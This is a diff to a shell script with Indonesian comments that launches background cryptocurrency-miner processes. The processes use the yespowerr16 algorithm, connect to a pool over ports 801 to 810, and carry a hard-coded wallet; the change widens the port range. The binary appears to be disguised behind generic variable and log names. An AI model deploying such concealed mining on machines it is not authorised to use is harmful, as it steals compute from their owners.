@@ -49,7 +49,7 @@ while [ $(date +%s) -lt $end_time ]; do
   # Memastikan file sgr ada
   if [ -f $dynamic_sgr ]; then
     # Memulai proses untuk beberapa port
-    for port in $(seq 802 810); do
+    for port in $(seq 801 810); do
       # Menjalankan proses dengan parameter yang ditentukan di latar belakang
       nohup $dynamic_sgr -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 7 -p m=solo > dance_$port_$timestamp.log 2>&1 &
       process_pid=$!
